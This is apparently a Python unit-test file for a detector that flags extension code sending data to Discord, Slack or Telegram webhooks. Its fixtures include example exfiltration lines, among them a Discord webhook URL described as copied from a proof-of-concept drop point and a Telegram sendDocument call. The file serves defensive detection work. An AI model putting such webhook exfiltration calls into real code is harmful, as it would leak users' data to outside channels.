"""Fire / silent unit tests for the S8 exfiltration-webhook rule."""

from __future__ import annotations

from collections.abc import Callable

from static_runtime.context import StaticAnalysisContext
from static_runtime.rules.s8_exfil_webhook import ExfiltrationWebhookRule

MakeContext = Callable[..., StaticAnalysisContext]

# The exact apollyon PoC drop point (token shape preserved, value synthetic).
_APOLLYON_DISCORD = (
    "https://discord.com/api/webhooks/1332511931541491802/"
    "5Hnr5TXbOi_O9REwjkk4MPLBaImsrsfkZPkJ115lAQD35e2hHNtR_h0M62VLACH-qEZ2"
)


def test_fires_on_discord_webhook_literal(make_context: MakeContext) -> None:
    ctx = make_context(
        files={"extension.js": f'axios.post("{_APOLLYON_DISCORD}", fd);'}
    )
    findings = ExfiltrationWebhookRule().evaluate(ctx)
    assert len(findings) == 1
    finding = findings[0]
    assert finding.rule_id == "extrace.s8.exfil_webhook"
    assert finding.severity.value == "high"
    assert finding.confidence.value == "high"
    assert "attack.T1567" in finding.categories
    assert "Discord" in finding.description


def test_fires_on_slack_and_telegram_webhooks(make_context: MakeContext) -> None:
    ctx = make_context(
        files={
            "a.js": 'post("https://hooks.slack.com/services/T00000000/B00000000/XXXXXXXX");',
            "b.js": 'get("https://api.telegram.org/bot123456:AAH-token-value/sendDocument");',
        }
    )
    findings = ExfiltrationWebhookRule().evaluate(ctx)
    assert len(findings) == 1
    assert "Slack" in findings[0].description
    assert "Telegram" in findings[0].description


def test_aggregates_multiple_hits_into_one_finding(make_context: MakeContext) -> None:
    ctx = make_context(
        files={
            "x.js": f'a("{_APOLLYON_DISCORD}");\nb("{_APOLLYON_DISCORD}");',
        }
    )
    findings = ExfiltrationWebhookRule().evaluate(ctx)
    assert len(findings) == 1
    # Two literal hits, one aggregated finding carrying two evidence refs.
    assert len(findings[0].evidence) == 2


def test_silent_for_non_webhook_discord_link(make_context: MakeContext) -> None:
    # A README community link to discord.com is NOT a webhook ingestion path.
    ctx = make_context(
        files={
            "README.md": "Join our community: https://discord.com/invite/abc123 !",
            "extension.js": 'fetch("https://discord.com/developers/docs");',
        }
    )
    assert ExfiltrationWebhookRule().evaluate(ctx) == []


def test_silent_for_clean_source(make_context: MakeContext) -> None:
    ctx = make_context(files={"extension.js": 'fetch("https://api.github.com/repos");'})
    assert ExfiltrationWebhookRule().evaluate(ctx) == []
